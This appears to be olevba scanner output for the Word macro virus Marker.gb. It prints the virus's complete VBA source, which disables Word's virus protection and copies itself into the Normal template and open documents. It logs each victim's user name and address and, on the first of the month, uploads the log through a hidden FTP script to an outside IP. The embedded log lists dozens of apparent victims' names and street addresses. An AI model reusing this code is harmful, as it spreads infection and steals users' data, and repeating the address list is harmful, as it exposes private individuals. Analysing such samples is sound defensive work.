olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.gb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.gb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
 Модуль1.ListOfFonts
End Sub

Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 16385, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 26384, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 09:23:32 AM - Wednesday, 23 Dec 1998
' bcbsa
'



' 12:08:05 PM - Monday, 4 Jan 1999
' ISG
'



' 02:41:37 PM - Tuesday, 5 Jan 1999
' Information Systems Group
'



' 12:49:03 PM - Saturday, 9 Jan 1999
' Mona Sowisky
' CSC Healthcare
' One Embarcadero, Suite 2800
' San Francisco, CA 94111



' 12:42:50 PM - Tuesday, 12 Jan 1999
' p2
'



' 05:10:21 PM - Thursday, 21 Jan 1999
' stevenkl
'



' 03:01:37 PM - Monday, 1 Feb 1999
' Mike Rubini
'



' 03:25:33 PM - Tuesday, 2 Feb 1999
' Marilyn Hoyles
'



' 04:13:43 PM - Thursday, 4 Feb 1999
' Sharon Kirsch
' 16-4111 Arbour Green Drive
' Mississauga, Ontario
' L5L 2Z2



' 04:08:01 PM - Monday, 8 Feb 1999
' Nancy Lyras
' Mr. & Mrs. George Lyras
' 5 Jamieson Court
' Sutton, MA  01590



' 11:21:09 AM - Friday, 12 Feb 1999
' Karen Poirier
' Karen L. Poirier
' 35 Windmill Drive
' Marlboro, MA  01752



' 03:55:49 PM - Tuesday, 16 Feb 1999
' Janice Levenson
'



' 02:23:17 PM - Tuesday, 23 Feb 1999
' Janice Levenson
'



' 05:14:00 PM - Tuesday, 23 Feb 1999
' IBU
'



' 08:25:02 AM - Thursday, 25 Feb 1999
' jzakarin
'



' 10:39:53  - Friday, 5 Mar 1999
' Graham Schultz
' Suite 17, Level 1
' Bridgepoint
' 3 Brady Street
' Mosman NSW 2088
' Australia



' 10:31:00 AM - Friday, 12 Mar 1999
' Richard Dagge
'



' 02:13:41  - jeudi, 15 avr 1999
' Anne Deneyer
'



' 12:39:45  - lundi, 19 avr 1999
' Fidelma Joyce
'



' 11:27:06  - вторник, 20 апр 1999
' Бобров
'



' 10:44:49  - вторник, 27 апр 1999
' Ветлужских
'



' 04:59:32  - Salэ, 29 Haz 1999
' Aylin ZAРRALI
'



' 10:42:41  - пятница, 9 июл 1999
' запад-восток
'



' 06:41:28  - четверг, 23 сен 1999
' Olga Brook
'



' 08:05:18 AM - Saturday, 27 Nov 1999
' xx
'



' 02:08:34  - понедельник, 27 дек 1999
' Albert
'



' 06:44:04  - понедельник, 10 янв 2000
' Albert
'



' 01:58:15  - вторник, 18 янв 2000
' tai
'



' 04:16:14  - четверг, 27 янв 2000
' 1
'



' 02:43:04 PM - суббота, 3 фев 2001
' CONSUCCO BUSINESS SERVICES
'



' 06:34:23 PM - вторник, 8 фев 2000
' Consulco Business Services
'



' 10:43:02  - четверг, 10 фев 2000
' Aram
'



' 12:18:21  - пятница, 10 мар 2000
' Tatyana
'



' 01:22:21  - суббота, 18 мар 2000
' Dmitry Kuryata
'



' 01:00:14  - понедельник, 20 Мар 2000
' Serega
'



' 04:35:35  - понедельник, 27 Мар 2000
' Serega
'



' 03:17:17  - понедельник, 10 апр 2000
' A109_1
'



' 08:08:36  - понедельник, 1 фев 1999
' guest
'



' 09:38:26  - пятница, 12 май 2000
' guest
'



' 02:11:25  - вторник, 23 май 2000
' GUEST
'



' 06:49:28  - четверг, 2 ноя 2000
' GUEST
'



' 05:50:33  - пятница, 3 ноя 2000
' d113_main
'



' 10:08:54  - четверг, 9 ноя 2000
' Voida Ludmila
'



' 06:21:52  - вторник, 5 дек 2000
' A109_1
'



Private Sub Document_New()

End Sub

Private Sub Document_Open()

End Sub
' 08:03:23  - суббота, 9 дек 2000
' Ashihmin Alexandr
'



' 02:04:26  - четверг, 21 дек 2000
' uuu
'



' 07:54:42  - субота, 30 Грг 2000
' A224_1
'



' 10:53:43  - суббота, 6 янв 2001
' User
'



' 06:33:00  - понедельник, 15 янв 2001
' mAn
'



' 09:55:19  - серада, 24 Сту 2001
' Eugen
'



' 09:59:44  - пятница, 16 фев 2001
' Office
'



' 03:44:14  - понедельник, 5 мар 2001
' Secretary
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

